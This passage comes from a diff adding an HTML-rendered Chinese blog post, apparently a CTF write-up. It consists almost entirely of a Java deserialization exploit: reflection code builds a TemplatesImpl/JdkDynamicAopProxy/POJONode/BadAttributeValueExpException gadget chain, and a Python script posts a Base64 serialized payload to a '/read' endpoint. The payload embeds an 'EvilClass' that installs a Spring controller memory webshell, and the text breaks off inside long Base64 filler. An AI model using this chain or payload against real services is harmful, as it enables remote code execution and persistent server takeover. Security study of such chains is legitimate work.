+        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//利用 JdkDynamicAopProxy 进行封装使其稳定触发</span>
+        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clazz <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Constructor<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cons <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>AdvisedSupport<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cons<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        AdvisedSupport advisedSupport <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AdvisedSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        advisedSupport<span class="token punctuation">.</span><span class="token function">setTarget</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        InvocationHandler handler <span class="token operator">=</span> <span class="token punctuation">(</span>InvocationHandler<span class="token punctuation">)</span> cons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>advisedSupport<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Object proxyObj <span class="token operator">=</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Templates<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        POJONode jsonNodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span>proxyObj<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        BadAttributeValueExpException exp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Field val <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javax.management.BadAttributeValueExpException"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        val<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        val<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>exp<span class="token punctuation">,</span>jsonNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        ByteArrayOutputStream barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        String res <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x\n"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token punctuation">}</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> String field<span class="token punctuation">,</span> Object arg<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
+        Field f <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>如果这里没有重写jackson的BaseJsonNode需要把注释取消掉，这条链子也比较稳定</p>
+<p>使用python向远程反序列化点发包即可：</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+<span class="token comment" spellcheck="true">#结尾无 /</span>
+baseUrl <span class="token operator">=</span> <span class="token string">"http://172.23.2.67"</span>
+burp0_url <span class="token operator">=</span> baseUrl <span class="token operator">+</span> <span class="token string">"/read"</span>
+burp0_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Transfer-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"chunked"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"text/plain"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">}</span>
+payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAK3QABFBvYzB0AAlQb2MwLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AFXhzcgAsY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuUE9KT05vZGUAAAAAAAAAAgIAAUwABl92YWx1ZXEAfgABeHIALWNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlZhbHVlTm9kZQAAAAAAAAABAgAAeHIAMGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLkJhc2VKc29uTm9kZQAAAAAAAAABAgAAeHBzfQAAAAEAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzeHIAF2phdmEubGFuZy5yZWZsZWN0LlByb3h54SfaIMwQQ8sCAAFMAAFodAAlTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25IYW5kbGVyO3hwc3IANG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5KZGtEeW5hbWljQW9wUHJveHlMxLRxDuuW/AIABFoADWVxdWFsc0RlZmluZWRaAA9oYXNoQ29kZURlZmluZWRMAAdhZHZpc2VkdAAyTG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL2ZyYW1ld29yay9BZHZpc2VkU3VwcG9ydDtbABFwcm94aWVkSW50ZXJmYWNlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwAABzcgAwb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkFkdmlzZWRTdXBwb3J0JMuKPPqkxXUCAAVaAAtwcmVGaWx0ZXJlZEwAE2Fkdmlzb3JDaGFpbkZhY3Rvcnl0ADdMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvZnJhbWV3b3JrL0Fkdmlzb3JDaGFpbkZhY3Rvcnk7TAAIYWR2aXNvcnNxAH4AB0wACmludGVyZmFjZXNxAH4AB0wADHRhcmdldFNvdXJjZXQAJkxvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9UYXJnZXRTb3VyY2U7eHIALW9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5Qcm94eUNvbmZpZ4tL8+an4PdvAgAFWgALZXhwb3NlUHJveHlaAAZmcm96ZW5aAAZvcGFxdWVaAAhvcHRpbWl6ZVoAEHByb3h5VGFyZ2V0Q2xhc3N4cAAAAAAAAHNyADxvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuRGVmYXVsdEFkdmlzb3JDaGFpbkZhY3RvcnlU3WQ34k5x9wIAAHhwc3EAfgAUAAAAAHcEAAAAAHhzcQB+ABQAAAAAdwQAAAAAeHNyADRvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC50YXJnZXQuU2luZ2xldG9uVGFyZ2V0U291cmNlfVVu9cf4+roCAAFMAAZ0YXJnZXRxAH4AAXhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3NxAH4AIEwABV9uYW1lcQB+AAVMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAbQXK/rq+AAAANAEYCgA+AI8IAE0LADMAkAoACQCRCwA0AJIKAJMAlAoAkwCVCgCWAJcHAJgIAJkKAJoAmwcAnAgAnQgAngoADACfCgAMAKAKAAwAoQoAFwCiCACjCgAXAKQIAKUIAG8HAKYHAKcJAKgAqQoAFwCqCgCrAKwIAK0KABcArgoArwCsCgCvALAHALEKABcAsgoAswCsBwC0CgCoALUKALMAtgoAIAC3CgCvALgKAKsAuQoAugC7CAC8CwC9AL4HAL8HAMALACwAwQoAIwDCCAB+BwDECABOBwDFBwDGCgAXAMcIAMgKAMMAyQsAygDLCwDKAMwKAAkAjwoALQDNBwDOCgA8AM8HANABAA9FVklMX0pOSV9CQVNFNjQBABJMamF2YS9sYW5nL1N0cmluZzsBAA1Db25zdGFudFZhbHVlAQAITElCX1BBVEgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAC0xFdmlsQ2xhc3M7AQAHZXhlY0NtZAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAQTWV0aG9kUGFyYW1ldGVycwEAA2NtZAEABXNoZWxsAQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAB2V4ZWNSZXMBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcApwEACkV4Y2VwdGlvbnMHANEBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwDSAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEACGpuaUJ5dGVzAQACW0IBABByYW5kb21BY2Nlc3NGaWxlAQAaTGphdmEvaW8vUmFuZG9tQWNjZXNzRmlsZTsBAAljbWRMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAEGNsYXNzTG9hZGVyQ2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEAEm5hdGl2ZUxpYnJhcnlDbGF6egEABGxvYWQBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABGxpYnMBABJMamF2YS91dGlsL1ZlY3RvcjsBABFuYXRpdmVMaWJyYXJ5Q29ucwEAH0xqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBABBuYXRpdmVMaWJyYXJ5T2JqAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHY29udGV4dAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dDsBABVtYXBwaW5nSGFuZGxlck1hcHBpbmcBAFRMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZzsBAAtjb25maWdGaWVsZAEABmNvbmZpZwEAFEJ1aWxkZXJDb25maWd1cmF0aW9uAQAMSW5uZXJDbGFzc2VzAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb247AQAHbWV0aG9kMgEABGluZm8BAD9Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBABhzcHJpbmdDb250cm9sbGVyTWVtU2hlbGwBAAJoaQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEAJkxqYXZhL3V0aWwvVmVjdG9yPExqYXZhL2xhbmcvT2JqZWN0Oz47AQAiTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yPCo+OwcAzgEAClNvdXJjZUZpbGUBAA5FdmlsQ2xhc3MuamF2YQwAQwBEDADTAEsMAEoASwwA1ADVBwDWDADXANgMANkARAcA2gwA2wDdAQAJRXZpbENsYXNzAVMAZjBWTVJnSUJBUUFBQUFBQUFBQUFBQU1BUGdBQkFBQUFBQUFBQUFBQUFBQkFBQUFBQUFBQUFNQTJBQUFBQUFBQUFBQUFBRUFBT0FBTEFFQUFIZ0FkQUFFQUFBQUVBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE2QVlBQUFBQUFBRG9CZ0FBQUFBQUFBQVFBQUFBQUFBQUFRQUFBQVVBQUFBQUVBQUFBQUFBQUFBUUFBQUFBQUFBQUJBQUFBQUFBQURCQkFBQUFBQUFBTUVFQUFBQUFBQUFBQkFBQUFBQUFBQUJBQUFBQkFBQUFBQWdBQUFBQUFBQUFDQUFBQUFBQUFBQUlBQUFBQUFBQU93QUFBQUFBQUFBN0FBQUFBQUFBQUFBRUFBQUFBQUFBQUVBQUFBR0FBQUFFQzRBQUFBQUFBQVFQZ0FBQUFBQUFCQStBQUFBQUFBQVVBSUFBQUFBQUFCWUFnQUFBQUFBQUFBUUFBQUFBQUFBQWdBQUFBWUFBQUFnTGdBQUFBQUFBQ0ErQUFBQUFBQUFJRDRBQUFBQUFBREFBUUFBQUFBQUFNQUJBQUFBQUFBQUNBQUFBQUFBQUFBRUFBQUFCQUFBQUtnQ0FBQUFBQUFBcUFJQUFBQUFBQUNvQWdBQUFBQUFBQ0FBQUFBQUFBQUFJQUFBQUFBQUFBQUlBQUFBQUFBQUFBUUFBQUFFQUFBQXlBSUFBQUFBQUFESUFnQUFBQUFBQU1nQ0FBQUFBQUFBSkFBQUFBQUFBQUFrQUFBQUFBQUFBQVFBQUFBQUFBQUFVK1YwWkFRQUFBQ29BZ0FBQUFBQUFLZ0NBQUFBQUFBQXFBSUFBQUFBQUFBZ0FBQUFBQUFBQUNBQUFBQUFBQUFBQ0FBQUFBQUFBQUJRNVhSa0JBQUFBQVFnQUFBQUFBQUFCQ0FBQUFBQUFBQUVJQUFBQUFBQUFEUUFBQUFBQUFBQU5BQUFBQUFBQUFBRUFBQUFBQUFBQUZIbGRHUUdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUFBQUFBQVV1VjBaQVFBQUFBUUxnQUFBQUFBQUJBK0FBQUFBQUFBRUQ0QUFBQUFBQUR3QVFBQUFBQUFBUEFCQUFBQUFBQUFBUUFBQUFBQUFBQUVBQUFBRUFBQUFBVUFBQUJIVGxVQUFnQUF3QVFBQUFBREFBQUFBQUFBQUFRQUFBQVVBQUFBQXdBQUFFZE9WUUFQUEVtQkFaZ3BmS2Z5ckNrQ2M0SFN5S3ZPemdBQUFBQUNBQUFBREFBQUFBRUFBQUFHQUFBQUlBQUFDQkFBQUFRTUFBQUFEUUFBQUdXUkxoS2JuaXo4QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFFQUFBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQWV3QUFBQklBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBZEFBQUFCSUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFvd0FBQUJJQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVlnQUFBQklBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBYndBQUFCSUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBUUFBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVhBQUFBQklBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBYUFBQUFCSUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFMQUFBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVJnQUFBQ0lBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBakFBQUFCSUFEZ0R0RWdBQUFBQUFBTVVCQUFBQUFBQUFWUUFBQUJJQURnRDVFUUFBQUFBQUFQUUFBQUFBQUFBQUFGOWZaMjF2Ymw5emRHRnlkRjlmQUY5SlZFMWZaR1Z5WldkcGMzUmxjbFJOUTJ4dmJtVlVZV0pzWlFCZlNWUk5YM0psWjJsemRHVnlWRTFEYkc5dVpWUmhZbXhsQUY5ZlkzaGhYMlpwYm1Gc2FYcGxBR1Y0WldOdFpBQndiM0JsYmdCbVoyVjBjd0J6ZEhKallYUUFabVZ2WmdCd1kyeHZjMlVBWDE5emRHRmphMTlqYUd0ZlptRnBiQUJLWVhaaFgwVjJhV3hEYkdGemMxOWxlR1ZqUTIxa0FHMWxiWE5sZEFCc2FXSmpMbk52TGpZQVIweEpRa05mTWk0eUxqVUFSMHhKUWtOZk1pNDBBQUFBQVFBQ0FBTUFBd0FEQUFNQUFRQURBQU1BQVFBREFBRUFBUUFBQUFFQUFnQ3FBQUFBRUFBQUFBQUFBQUIxR21rSkFBQURBTFFBQUFBUUFBQUFGR2xwRFFBQUFnREFBQUFBQUFBQUFCQStBQUFBQUFBQUNBQUFBQUFBQUFEd0VRQUFBQUFBQUJnK0FBQUFBQUFBQ0FBQUFBQUFBQUN3RVFBQUFBQUFBRmhBQUFBQUFBQUFDQUFBQUFBQUFBQllRQUFBQUFBQUFPQS9BQUFBQUFBQUJnQUFBQUVBQUFBQUFBQUFBQUFBQU9nL0FBQUFBQUFBQmdBQUFBY0FBQUFBQUFBQUFBQUFBUEEvQUFBQUFBQUFCZ0FBQUFvQUFBQUFBQUFBQUFBQUFQZy9BQUFBQUFBQUJnQUFBQXNBQUFBQUFBQUFBQUFBQUJoQUFBQUFBQUFBQndBQUFBSUFBQUFBQUFBQUFBQUFBQ0JBQUFBQUFBQUFCd0FBQUFNQUFBQUFBQUFBQUFBQUFDaEFBQUFBQUFBQUJ3QUFBQVFBQUFBQUFBQUFBQUFBQURCQUFBQUFBQUFBQndBQUFBVUFBQUFBQUFBQUFBQUFBRGhBQUFBQUFBQUFCd0FBQUFZQUFBQUFBQUFBQUFBQUFFQkFBQUFBQUFBQUJ3QUFBQTBBQUFBQUFBQUFBQUFBQUVoQUFBQUFBQUFBQndBQUFBZ0FBQUFBQUFBQUFBQUFBRkJBQUFBQUFBQUFCd0FBQUFrQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB